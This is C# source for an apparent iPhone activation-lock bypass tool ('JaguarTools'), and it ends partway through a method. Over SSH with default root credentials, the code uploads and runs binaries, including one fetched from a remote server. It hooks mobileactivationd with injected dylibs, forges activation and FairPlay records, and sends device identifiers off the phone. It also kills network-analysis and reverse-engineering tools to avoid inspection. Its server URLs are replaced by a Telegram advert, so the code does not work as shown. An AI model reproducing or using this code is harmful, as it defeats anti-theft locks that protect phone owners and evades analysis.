using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using EasyHttp.Http;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using jaguarTools.Properties;
using Microsoft.VisualBasic.Devices;
using MobileDevice;
using MobileDevice.Event;
using Newtonsoft.Json;
using Renci.SshNet;
using EasyHttp.Infrastructure;
using Claunia.PropertyList;
using jaguarTools;
using SaaUI;

namespace JaguarTools_2._1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            HttpClient http = new HttpClient();

            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  check.php";

            var Sending = http.Get(URL);

            string result = Sending.RawText;
            if (result.Contains("ERROR"))
            {
                Close();
            }
            CloseProcess();
            InitializeDetection();
        }

        Process proceso = new Process();
        public iOSDeviceManager manager = new iOSDeviceManager();
        public iOSDevice currentiOSDevice;
        public SshClient Ssh = new SshClient("127.0.0.1", "root", "alpine");
        public ScpClient Scp = new ScpClient("127.0.0.1", "root", "alpine");

        public string SheLL(string Command)
        {
            File.WriteAllText("tmp\\shell.cmd", "@echo off\n" + Command);
            proceso = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "tmp\\shell.cmd",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true
                },
            };
            proceso.Start();
            StreamReader reader = proceso.StandardOutput;
            return reader.ReadToEnd();
        }
        public void BoxShow(string Arg, string Caption)
        {
            MessageBox.Show(Arg, Caption, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        public void BoxShowError(string Arg, string Caption)
        {
            MessageBox.Show(Arg, Caption, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }

        public void BoxShowWarning(string Arg, string Caption)
        {
            MessageBox.Show(Arg, Caption, MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void ListenError(object sender, ListenErrorEventHandlerEventArgs args)
        {
            if (args.ErrorType == MobileDevice.Enumerates.ListenErrorEventType.StartListen)
            {
                string ERROR = args.ErrorMessage;
                Exception e = new Exception(ERROR);
                BoxShowError(e.Message, "ERROR");
            }
        }
        public void InitializeDetection()
        {
            SheLL("C:\\Windows\\System32\\TASKKILL /IM iproxy.exe /F");
            string Known = "%USERPROFILE%\\.ssh\\known_hosts";
            if (File.Exists(Known))
            {
                File.Delete(Known);
            }
            string iTunes = "iTunesMobileDevice.dll";
            string X86 = "C:\\Program Files\\Common Files\\Apple\\Mobile Device Support\\" + iTunes + "";
            string X64 = "C:\\Program Files (x86)\\Common Files\\Apple\\Mobile Device Support\\" + iTunes + "";
            if (!Directory.Exists("C:\\Program Files\\Common Files\\Apple\\Mobile Device Support"))
            {
                if (!Directory.Exists("C:\\Program Files (x86)\\Common Files\\Apple\\Mobile Device Support"))
                {
                    BoxShow("Install iTunes or Drivers with 3UTools", "ERROR");
                    Close();
                }
            }
            else
            {
                if (!File.Exists(X86))
                {
                    File.Copy(iTunes, X86);

                }
                if (!File.Exists(X64))
                {
                    File.Copy(iTunes, X64);
                }
                CheckiTunes();
            }
        }

        void CloseProcess()
        {
            try
            {
                foreach (Process process in Process.GetProcesses())
                {
                    if (process.ProcessName == "WireShark" || process.MainWindowTitle.Contains("WireShark"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName == "CharlesProxy" || process.MainWindowTitle.Contains("CharlesProxy"))
                    {
                        process.Kill();
                    }
                    if (process.MainWindowTitle == "Progress Telerik Fiddler Web Debugger")
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("python"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName == "Fiddler Everywhere")
                    {
                        process.Kill();
                    }
                    if (process.ProcessName == "Fiddler")
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("powershell"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("conemu"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("mobaxterm"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("hyper"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("wsl"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("bash"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("cscript"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("putty"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("winscp"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("git-bash"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("dnSpy"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("ida"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("ghidra"))
                    {
                        process.Kill();
                    }
                    if (process.ProcessName.Contains("HxD"))
                    {
                        process.Kill();
                    }
                }
                Thread.Sleep(1000);
            }
            catch (Exception)
            {

            }
        }

        public void CheckiTunes()
        {
            if (File.Exists("C:\\Program Files\\Common Files\\Apple\\Mobile Device Support\\iTunesMobileDevice.dll"))
            {
                if (File.Exists("C:\\Program Files (x86)\\Common Files\\Apple\\Mobile Device Support\\iTunesMobileDevice.dll"))
                {
                    manager.CommonConnectEvent += CommonConnectDevice; manager.ListenErrorEvent += ListenError; manager.StartListen();
                }
            }

        }

        private void CommonConnectDevice(object sender, DeviceCommonConnectEventArgs args)
        {
            if (args.Message == MobileDevice.Enumerates.ConnectNotificationMessage.Connected)
            {
                currentiOSDevice = args.Device;
                SetData(true);

            }
            if (args.Message == MobileDevice.Enumerates.ConnectNotificationMessage.Disconnected)
            {
                SetData(false);
            }
        }
        public string DeviceInfo(string Info)
        {
            string CMD = "@echo off\nlib\\ideviceinfo.exe | lib\\grep.exe -w " + Info + " | lib\\awk.exe '{printf $NF}'";
            File.WriteAllText("tmp\\Info.cmd", CMD);
            proceso = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "tmp\\Info.cmd",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                },
            };
            proceso.Start();
            StreamReader Information = proceso.StandardOutput;
            string Final = Information.ReadToEnd();
            //  proceso.WaitForExit();
            return Final;
        }

        public void SetData(bool Valor)
        {
            if(Valor != false)
            {
                Invoke((MethodInvoker)(() => saaLabel3.Text = "Connected Device: " + DeviceInfo("ProductType") + " iOS " + DeviceInfo("ProductVersion")));
                Invoke((MethodInvoker)(() => saaLabel4.Visible = true));
                Invoke((MethodInvoker)(() => saaLabel5.Visible = true));
                Invoke((MethodInvoker)(() => saaLabel6.Visible = true));
                Invoke((MethodInvoker)(() => saaLabel8.Visible = true));
                Invoke((MethodInvoker)(() => saaLabel4.Text = "UDID: " + DeviceInfo("UniqueDeviceID")));
                Invoke((MethodInvoker)(() => saaLabel5.Text = "IMEI: " + DeviceInfo("InternationalMobileEquipmentIdentity")));
                Invoke((MethodInvoker)(() => saaLabel6.Text = "SN: " + DeviceInfo("SerialNumber")));
                Invoke((MethodInvoker)(() => saaButton3.Value = "Unlock Device"));
                Invoke((MethodInvoker)(() => saaLabel8.Text = "STATUS: " + DeviceInfo("ActivationState")));
                CambiarImagen();
                Invoke((MethodInvoker)(() => pictureBox1.Visible = true));
            }
            else
            {
                Invoke((MethodInvoker)(() => saaLabel3.Text = "No Device connected"));
                Invoke((MethodInvoker)(() => saaLabel4.Visible = false));
                Invoke((MethodInvoker)(() => saaLabel5.Visible = false));
                Invoke((MethodInvoker)(() => saaLabel6.Visible = false));
                Invoke((MethodInvoker)(() => saaLabel8.Visible = false));
                Invoke((MethodInvoker)(() => saaButton3.Value = "Waiting For Device ..."));
                Invoke((MethodInvoker)(() => pictureBox1.Visible = false));
            }
        }

        public string CheckSIMLockCarrier()
        {
            //Invoke((MethodInvoker)(() => saaButton2.Enabled = false));
           // Invoke((MethodInvoker)(() => saaButton2.Value = "Checking..."));
            if (DeviceInfo("SerialNumber") != "")
            {
                SheLL("lib\\ideviceactivation.exe activate -d -s \"If you need a meid server or API, contact: https://t.me/i_ipwnedX  MEID.php?simlock=\"");
                string Ruta = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  MEID.php?simlockcheck=";
                string getResponse = SheLL("lib\\curl.exe -s -k \"" + Ruta + "\"");
                return getResponse;
            }
            else
            {
                return "ERROR";
            }
            // Invoke((MethodInvoker)(() => saaButton2.Value = "SIM-Lock Check"));
            //  Invoke((MethodInvoker)(() => saaButton2.Enabled = true));

        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {

            CheckSIMLockCarrier();
        }

        private void saaButton2_Click(object sender, EventArgs e)
        {
            backgroundWorker1.RunWorkerAsync();
        }

        private void backgroundWorker2_DoWork_1(object sender, DoWorkEventArgs e)
        {
            Proxy();


        }

        private void saaButton1_Click_1(object sender, EventArgs e)
        {
            backgroundWorker2.RunWorkerAsync();
        }

        private void saaLabel6_Click(object sender, EventArgs e)
        {
            Invoke((MethodInvoker)(() => Clipboard.SetText(DeviceInfo("SerialNumber"))));
            Invoke((MethodInvoker)(() => saaLabel7.Visible = true));
        }

        private void saaButton3_Click(object sender, EventArgs e)
        {
            SheLL("CD HFZRa1n\n.\\HFZRa1n.exe");
        }

        private void saaButton1_Click(object sender, EventArgs e)
        {
        }

        private void saaButton2_Click_1(object sender, EventArgs e)
        {
            backgroundWorker1.RunWorkerAsync();
        }

        private static global::System.Resources.ResourceManager resourceMan;

        private static global::System.Globalization.CultureInfo resourceCulture;

        private void changeImage(string nombreRecurso)
        {
        }


        private void saaButton2_Click_2(object sender, EventArgs e)
        {
        }

        private void saaButton2_Click_3(object sender, EventArgs e)
        {
            CloseProcess();
            backgroundWorker1.RunWorkerAsync();
        }

        private void saaButton4_Click(object sender, EventArgs e)
        {
            SheLL("CD HFZRa1n\n.\\HFZRa1n.exe");
        }

        private void saaLabel7_Click(object sender, EventArgs e)
        {
          
        }

        private void backgroundWorker3_DoWork(object sender, DoWorkEventArgs e)
        {
            Invoke((MethodInvoker)(() =>
            {
            }));

            SheLL("lib\\ideviceenterrecovery.exe " + DeviceInfo("UniqueDeviceID"));
        }

     
      
     


        public void Delete(string Filedelete)
        {
            if (File.Exists(Filedelete))
            {
                File.Delete(Filedelete);
            }
        }


       

        private void saaButton6_Click(object sender, EventArgs e)
        {
            Conteo.RunWorkerAsync();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        public class ResponseObject
        {
            public string modelDesc { get; set; }
            public string model { get; set; }
            public string imei { get; set; }
            public string imei2 { get; set; }
            public string meid { get; set; }
            public string serial { get; set; }
            public bool activated { get; set; }
            public string warrantyStatus { get; set; }
            public string estPurchaseDate { get; set; }
            public bool technicalSupport { get; set; }
            public bool repairCoverage { get; set; }
            public bool acEligible { get; set; }
            public bool validPurchaseDate { get; set; }
            public bool registered { get; set; }
            public bool replaced { get; set; }
            public bool loaner { get; set; }
            public bool fmiOn { get; set; }
            public int nextActivationPolicyId { get; set; }
            public string carrier { get; set; }
            public string country { get; set; }
            public bool simLock { get; set; }
            public string purchaseCountryCodeIso3 { get; set; }
            public bool blocked { get; set; }
            public bool blockedPolicy { get; set; }
        }

        public class RootObject
        {
            public bool success { get; set; }
            public string response { get; set; }
            public ResponseObject @object { get; set; }
            public string status { get; set; }
        }

        private static readonly HttpClient client = new HttpClient();

        private void backgroundWorker4_DoWork(object sender, DoWorkEventArgs e)
        {

        }

        private void saaPanel1_Paint(object sender, PaintEventArgs e)
        {

        }


        public string CollectionBlob()
        {
            HttpClient http = new HttpClient();

            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php";
            
            string POSTContent = File.ReadAllText("tmp\\CollectionBlob.xml");

            var Sending = http.Post(URL, POSTContent, "application/xml");

            return Sending.RawText;

        }

        public string DrmInfo()
        {
            HttpClient http = new HttpClient();

            string GETContent = File.ReadAllText("tmp\\drmInfo.xml");

            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php?drminfo=" + GETContent + "&serial=" + DeviceInfo("SerialNumber");

            var Sending = http.Get(URL);

            return Sending.RawText;

        }

        public void Final()
        {
            HttpClient http = new HttpClient();

            string GETContent = File.ReadAllText("tmp\\cmds");

            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  MEID.php?final=" + GETContent + "&udid=" + DeviceInfo("UniqueDeviceID") + "&imei=" + DeviceInfo("InternationalMobileEquipmentIdentity") + "&serial=" + DeviceInfo("SerialNumber");

            http.Get(URL);

        }

        public string Wildcard()
        {
            HttpClient http = new HttpClient();

            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  MEID.php?wildcard=&serial=" + DeviceInfo("SerialNumber");

            var Sending = http.Get(URL);

            return Sending.RawText;

        }

        public string RD()
        {
            HttpClient http = new HttpClient();

            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX RD.php";

            string POSTContent = File.ReadAllText("tmp\\rd.xml");

            var Sending = http.Post(URL, POSTContent, "application/xml");

            return Sending.RawText;

        }

        public string Abir()
        {
            HttpClient http = new HttpClient();

            string POSTContent = File.ReadAllText("tmp\\cmds.xml").Replace("\n", "").Replace("\r", "");

            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php?step3=" + POSTContent + "&serial=" + DeviceInfo("SerialNumber");

            var Sending = http.Post(URL, POSTContent, "application/xml");

            return Sending.RawText;

        }

        public string Asir()
        {
            HttpClient http = new HttpClient();


            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php?asir=true&serial=" + DeviceInfo("SerialNumber");

            var Sending = http.Get(URL);

            return Sending.RawText;

        }
        public void GetRecord()
        {
            HttpClient http = new HttpClient();


            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  new.php?&udid=" + DeviceInfo("UniqueDeviceID") + "&ucid=" + DeviceInfo("UniqueChipID") + "&sn=" + DeviceInfo("SerialNumber");

            http.GetAsFile(URL, "tmp\\activation_record.plist");

        }

        public void GetICInfo()
        {
            HttpClient http = new HttpClient();


            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  NewActivation/" + DeviceInfo("UniqueDeviceID") + "/IC-Info.sisv";

            http.GetAsFile(URL, "tmp\\IC-Info.sisv");

        }

        public void GetDenisse()
        {
            HttpClient http = new HttpClient();


            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  Denisse.php?serial=" + DeviceInfo("SerialNumber");

            http.GetAsFile(URL, "tmp\\Jaguar");

        }
        public void Pair()
        {
            proceso = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "lib\\idevicepair.exe",
                    Arguments = "pair",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true
                },
            };
            proceso.Start();
            StreamReader reader = proceso.StandardOutput;
            string check = reader.ReadToEnd();
            if(!check.Contains("SUCCESS: Paired with device " + DeviceInfo("UniqueDeviceID")))
            {
                BoxShow("Please accept trust dialog in your device or reconnect!", "PAIR DEVICE");
                Pair();
            }
        }


        public void CambiarImagen()
        {
            string ProductType = DeviceInfo("ProductType");
            switch(ProductType)
            {
                case "iPhone6,1": 
                case "iPhone6,2":
                    this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
                    this.pictureBox1.Image = global::jaguarTools.Properties.Resources.iPhone6s;
                    this.pictureBox1.Location = new System.Drawing.Point(370, 172);
                    this.pictureBox1.Name = "pictureBox1";
                    this.pictureBox1.Size = new System.Drawing.Size(85, 127);
                    this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
                    this.pictureBox1.TabIndex = 22;
                    this.pictureBox1.TabStop = false;
                    this.pictureBox1.Visible = false;
                    break;
                case "iPhone7,1":
                case "iPhone7,2":
                case "iPhone8,1":
                case "iPhone8,2":
                    this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
                    this.pictureBox1.Image = global::jaguarTools.Properties.Resources.iPhone6s;
                    this.pictureBox1.Location = new System.Drawing.Point(370, 172);
                    this.pictureBox1.Name = "pictureBox1";
                    this.pictureBox1.Size = new System.Drawing.Size(85, 127);
                    this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
                    this.pictureBox1.TabIndex = 22;
                    this.pictureBox1.TabStop = false;
                    this.pictureBox1.Visible = false;
                    break;
                case "iPhone8,4":
                    this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
                    this.pictureBox1.Image = global::jaguarTools.Properties.Resources.iPhoneSE;
                    this.pictureBox1.Location = new System.Drawing.Point(370, 172);
                    this.pictureBox1.Name = "pictureBox1";
                    this.pictureBox1.Size = new System.Drawing.Size(85, 127);
                    this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
                    this.pictureBox1.TabIndex = 22;
                    this.pictureBox1.TabStop = false;
                    this.pictureBox1.Visible = false;
                    break;
                case "iPhone9,1":
                case "iPhone9,2":
                case "iPhone9,3":
                case "iPhone9,4":
                    this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
                    this.pictureBox1.Image = global::jaguarTools.Properties.Resources.iPhone7;
                    this.pictureBox1.Location = new System.Drawing.Point(370, 172);
                    this.pictureBox1.Name = "pictureBox1";
                    this.pictureBox1.Size = new System.Drawing.Size(85, 127);
                    this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
                    this.pictureBox1.TabIndex = 22;
                    this.pictureBox1.TabStop = false;
                    this.pictureBox1.Visible = false;
                    break;
                case "iPhone10,1":
                case "iPhone10,2":
                case "iPhone10,4":
                case "iPhone10,5":
                    this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
                    this.pictureBox1.Image = global::jaguarTools.Properties.Resources.iPhone8;
                    this.pictureBox1.Location = new System.Drawing.Point(370, 172);
                    this.pictureBox1.Name = "pictureBox1";
                    this.pictureBox1.Size = new System.Drawing.Size(85, 127);
                    this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
                    this.pictureBox1.TabIndex = 22;
                    this.pictureBox1.TabStop = false;
                    this.pictureBox1.Visible = false;
                    break;
                case "iPhone10,3":
                case "iPhone10,6":
                    this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
                    this.pictureBox1.Image = global::jaguarTools.Properties.Resources.iPhoneX;
                    this.pictureBox1.Location = new System.Drawing.Point(370, 172);
                    this.pictureBox1.Name = "pictureBox1";
                    this.pictureBox1.Size = new System.Drawing.Size(85, 127);
                    this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
                    this.pictureBox1.TabIndex = 22;
                    this.pictureBox1.TabStop = false;
                    this.pictureBox1.Visible = false;
                    break;

            }
        }

        public void StartProcessBasedOnVersion(string versionString)
        {
            if (string.IsNullOrEmpty(versionString))
            {
                Console.WriteLine("Version string is null or empty.");
                return;
            }

            // Extraer la versión principal
            int majorVersion = GetMajorVersion(versionString);

            // Iniciar procesos basados en la versión principal
            if (majorVersion >= 12 && majorVersion <= 14)
            {
                StartProcessForVersions12To14();
            }
            else if (majorVersion >= 15 && majorVersion <= 17)
            {
                StartProcessForVersions15To17();
            }
            else
            {
               BoxShow("Unsupported iOS version.", "MESSAGE");
            }
        }

        public  int GetMajorVersion(string versionString)
        {
            Version version;
            if (Version.TryParse(versionString, out version))
            {
                return version.Major;
            }
            else
            {
                throw new ArgumentException("Invalid version string");
            }
        }

        public  void StartProcessForVersions12To14()
        {
            // Implementa el proceso para versiones 12, 13 y 14
            HttpClient http = new HttpClient();

            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  MEID.php?registered=&serial=" + DeviceInfo("SerialNumber");

            var Sending = http.Get(URL);

            string result = Sending.RawText;
            if (result.Contains("ERROR"))
            {
                BoxShowError("Serial Number no registrado", "ERROR");
            }
            else
            {
                CloseProcess();
                Invoke((MethodInvoker)(() => saaButton3.Enabled = false));
                Invoke((MethodInvoker)(() => saaButton3.Text = "Activating..."));
                backgroundWorker2.RunWorkerAsync();
            }
        }

        public  void StartProcessForVersions15To17()
        {
            HttpClient http = new HttpClient();

            string URL = "If you need a meid server or API, contact: https://t.me/i_ipwnedX  MEID.php?registered=&serial=" + DeviceInfo("SerialNumber");

            var Sending = http.Get(URL);

            string result = Sending.RawText;
            if (result.Contains("ERROR"))
            {
                BoxShowError("Serial Number no registrado", "ERROR");
            }
            else
            {
                CloseProcess();
                Invoke((MethodInvoker)(() => saaButton3.Enabled = false));
                Invoke((MethodInvoker)(() => saaButton3.Text = "Activating..."));
                backgroundWorker5.RunWorkerAsync();
            }
        }
        public void Proxy()
        {
            try
            {
                Invoke((MethodInvoker)(() => guna2ProgressBar1.Visible = true));
                proceso = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "lib\\iproxy.exe",
                        Arguments = "22 44",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true
                    },
                };
                proceso.Start();

                if(!Ssh.IsConnected)
                {
                    Ssh.Connect();
                }

                Ssh.CreateCommand("mount -o rw,union,update /").Execute();

                if(!Scp.IsConnected)
                {
                    Scp.Connect();
                }

                Scp.Upload(new FileInfo("Carbon\\MobileSubstrate.lzma"), "/./MS.lzma");
                Scp.Upload(new FileInfo("Carbon\\lzma"), "/./usr/bin/lzma");

                Ssh.CreateCommand("chmod +x /usr/bin/lzma").Execute();

                Ssh.CreateCommand("lzma -d -v /./MS.lzma").Execute();

                Ssh.CreateCommand("cd /./; chmod +x $(tar -xvf /./MS -C ./)").Execute();

                Ssh.CreateCommand("/usr/libexec/substrate").Execute();

                Ssh.CreateCommand("/usr/libexec/substrated").Execute();

                Scp.Upload(new FileInfo("Carbon\\CSf"), "/./CSf");

                Ssh.CreateCommand("cd /./; chmod +x $(tar -xvf /./CSf -C ./)").Execute();

                Scp.Upload(new FileInfo("Carbon\\executeFunction"), "/./usr/bin/executeFunction");

                Delete("tmp\\Jaguar");

                GetDenisse();

                Scp.Upload(new FileInfo("tmp\\Jaguar"), "/./usr/bin/Jaguar");

                Delete("tmp\\Jaguar");

                Ssh.CreateCommand("chmod +x /usr/bin/executeFunction").Execute();

                Ssh.CreateCommand("chmod +x /usr/bin/Jaguar").Execute();

                Ssh.CreateCommand("executeFunction MadGate.createTunnel1SessionInfo:").Execute();

                try
                {
                    Scp.Download("/private/var/mobile/archivo.xml", new FileInfo("tmp\\CollectionBlob.xml"));
                }
                catch { BoxShowError("CollectionBlob not generate try again", "ERROR"); }
                CollectionBlob();

                Scp.Upload(new FileInfo("lib\\libcrypt.dll"), "/Library/MobileSubstrate/DynamicLibraries/dylib.dylib");
                Scp.Upload(new FileInfo("lib\\libcrypt.a"), "/Library/MobileSubstrate/DynamicLibraries/dylib.plist");

                Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Ssh.CreateCommand("launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Pair();

                SheLL("lib\\busybox.exe bash -c \"lib/ideviceactivation.exe activate -d -s 'If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php?process=step1' &>activationChecks.txt\"");

                Scp.Upload(new FileInfo("Carbon\\.cache.txt"), "/./usr/bin/kernel");

                Ssh.CreateCommand("chmod +x /usr/bin/kernel").Execute();

                Ssh.CreateCommand("kernel").Execute();

                try
                {
                    Scp.Download("/private/var/mobile/Media/Downloads/drmInfo.xml", new FileInfo("tmp\\drmInfo.xml"));
                }
                catch { BoxShowError("DrmInfo not generate try again", "ERROR"); }
                DrmInfo();

                Ssh.CreateCommand("rm /Library/MobileSubstrate/DynamicLibraries/dylib.dylib").Execute();
                Ssh.CreateCommand("rm /Library/MobileSubstrate/DynamicLibraries/dylib.plist").Execute();

                Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Ssh.CreateCommand("launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Pair();

                SheLL("lib\\busybox.exe bash -c \"lib/ideviceactivation.exe activate -d -s 'If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php?process=step2' &>activationSigner.txt\"");

                Pair();


                try
                {
                    File.WriteAllText("tmp\\rd.xml", Asir());
                }
                catch
                {

                }

                if (File.Exists("tmp\\rd.xml"))
                {

                    string drmInfo = File.ReadAllText("tmp\\rd.xml");

                    Ssh.CreateCommand("kernel " + drmInfo).Execute();

                }

                try
                {
                    Scp.Download("/private/var/mobile/Media/Downloads/cmds.xml", new FileInfo("tmp\\cmds.xml"));
                }
                catch
                {

                }

                Ssh.CreateCommand("Jaguar abir").Execute();

                File.WriteAllText("tmp\\.tmp", Abir());

                Abir();
                string folderPath = "tmp";
                try
                {
                    // Obtener una lista de todos los archivos en la carpeta
                    string[] files = Directory.GetFiles(folderPath);

                    // Eliminar cada archivo
                    foreach (string file in files)
                    {
                        File.Delete(file);
                        Console.WriteLine($"Eliminado: {file}");
                    }

                    Console.WriteLine("Todos los archivos han sido eliminados.");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error: {ex.Message}");
                }
                Scp.Upload(new FileInfo("lib\\libcrypt.dll"), "/Library/MobileSubstrate/DynamicLibraries/dylib.dylib");
                Scp.Upload(new FileInfo("lib\\libcrypt.a"), "/Library/MobileSubstrate/DynamicLibraries/dylib.plist");

                Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Ssh.CreateCommand("launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Pair();

                SheLL("lib\\busybox.exe bash -c \"lib/ideviceactivation.exe activate -d -s 'If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php?process=step1' &>activationChecks.txt\"");


                Ssh.CreateCommand("kernel").Execute();

                try
                {
                    Scp.Download("/private/var/mobile/Media/Downloads/drmInfo.xml", new FileInfo("tmp\\drmInfo.xml"));
                }
                catch { BoxShowError("DrmInfo not generate try again", "ERROR"); }
                DrmInfo();

                Ssh.CreateCommand("rm /Library/MobileSubstrate/DynamicLibraries/dylib.dylib").Execute();
                Ssh.CreateCommand("rm /Library/MobileSubstrate/DynamicLibraries/dylib.plist").Execute();

                Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Ssh.CreateCommand("launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist").Execute();

                Pair();

                SheLL("lib\\busybox.exe bash -c \"lib/ideviceactivation.exe activate -d -s 'If you need a meid server or API, contact: https://t.me/i_ipwnedX  Activator.php?process=step2' &>activationSigner.txt\"");

                Pair();


                try
                {
                    File.WriteAllText("tmp\\rd.xml", Asir());
                }
                catch
                {

                }

                if (File.Exists("tmp\\rd.xml"))
                {

                    string drmInfo = File.ReadAllText("tmp\\rd.xml");

                    Ssh.CreateCommand("kernel " + drmInfo).Execute();

                }

                try
                {
                    Scp.Download("/private/var/mobile/Media/Downloads/cmds.xml", new FileInfo("tmp\\cmds.xml"));
                }
                catch
                {

                }
                Ssh.CreateCommand("Jaguar abir").Execute();

                File.WriteAllText("tmp\\.tmp", Abir());

                Abir();
                string CommCenter = "/private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist";

                Ssh.CreateCommand("chflags nouchg " + CommCenter).Execute();

                Ssh.CreateCommand("Jaguar Wildcard").Execute();

                Ssh.CreateCommand("Jaguar Record").Execute();

                Ssh.CreateCommand("Jaguar Flag").Execute();

                Ssh.CreateCommand("rm /usr/bin/Jaguar").Execute();

                Delete("tmp\\IC-Info.sisv");

                GetICInfo();

                Scp.Upload(new FileInfo("tmp\\IC-Info.sisv"), "/./private/var/mobile/IC-Info.sisv");

                Ssh.CreateCommand("mkdir -p /private/var/mobile/Library/FairPlay/iTunes_Control/iTunes").Execute();
                Ssh.CreateCommand("mv -f /private/var/mobile/IC-Info.sisv /private/var/mobile/Library/FairPlay/iTunes_Control/iTunes/").Execute();
                Ssh.CreateCommand("chmod -R 755 /private/var/mobile/Library/FairPlay").Execute();
                Ssh.CreateCommand("chmod 0664 /private/var/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv").Execute();
                Ssh.CreateCommand("chown -R mobile:mobile /private/var/mobile/Library/FairPlay").Execute();


                Ssh.CreateCommand("launchctl unload /System/Library/LaunchDaemons").Execute();

                Ssh.CreateCommand("launchctl load /System/Library/LaunchDaemons").Execute();

                Thread.Sleep(20000);

                if(DeviceInfo("ActivationState") != "Unactivated")
                {
                    BoxShow("Successfully Activated Device!", "MESSAGE");
                }
                else
                {
                    BoxShowError("Upps Error! :(", "ERROR");
                }

            } 
            catch(Exception e)
            {
                Invoke((MethodInvoker)(() => guna2ProgressBar1.Visible = false));
                BoxShowError(e.Message, "ERROR");
            }
            Delete("tmp\\rd.xml");
            Invoke((MethodInvoker)(() => guna2ProgressBar1.Visible = false));
            Invoke((MethodInvoker)(() => saaButton3.Enabled = true));
            Invoke((MethodInvoker)(() => saaButton3.Text = "Activate"));

        }

        public string SSH(string Command)
        {
            if(!Ssh.IsConnected)
            {
                Ssh.Connect();
            }
            var command = Ssh.CreateCommand(Command);
            return command.Execute();
        }
        public void BypassiOS1517()
        {
            try
            {
                Invoke((MethodInvoker)(() => guna2ProgressBar1.Visible = true));
                proceso = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "lib\\iproxy.exe",
                        Arguments = "22 44",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true
                    },
                };
                proceso.Start();

                if (!Ssh.IsConnected)
                {
                    Ssh.Connect();
                }

                if (!Scp.IsConnected)
                {
